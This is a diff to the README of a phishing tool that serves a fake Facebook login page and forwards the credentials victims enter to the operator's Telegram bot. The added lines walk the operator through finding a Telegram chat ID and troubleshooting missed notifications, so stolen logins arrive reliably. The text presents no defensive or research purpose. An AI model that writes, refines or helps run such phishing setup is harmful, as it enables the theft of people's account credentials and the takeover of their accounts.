@@ -24,7 +24,14 @@ This tool creates a convincing Facebook login page that sends login notification
 
 1. Rename `.env.example` to `.env`
 2. Replace `your_telegram_bot_token_here` with your actual Telegram bot token
-3. Save the file
+3. To get your Telegram chat ID:
+   - Send a message to your bot in Telegram
+   - Visit `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates` in your browser (replace `<YOUR_BOT_TOKEN>` with your actual token)
+   - Look for `"chat":{"id":XXXXXXXXX}` in the response - that number is your chat ID
+   - Add this chat ID to your `.env` file as `TELEGRAM_CHAT_ID=XXXXXXXXX`
+4. Save the file
+
+Note: If you don't set the chat ID, the application will try to detect it automatically, but specifying it explicitly is more reliable.
 
 ### 3. Run the Application
 
@@ -62,7 +69,15 @@ When someone enters login credentials on the fake Facebook page:
 - If you're not receiving Telegram notifications, make sure:
   - Your bot token is correct in the `.env` file
   - You've sent at least one message to your bot on Telegram
+  - You've set the correct chat ID in the `.env` file (or let the application detect it automatically)
   - Your server has internet access
+
+- If the application says it cannot find your chat ID:
+  1. Start a new conversation with your bot in Telegram (send any message to it)
+  2. Restart the application
+  3. Try logging in to trigger a notification
+  4. Check the console logs for a message like "Found chat ID from updates: XXXXXXXXX"
+  5. Copy that number into your .env file as TELEGRAM_CHAT_ID=XXXXXXXXX
 
 ## Privacy and Security
 
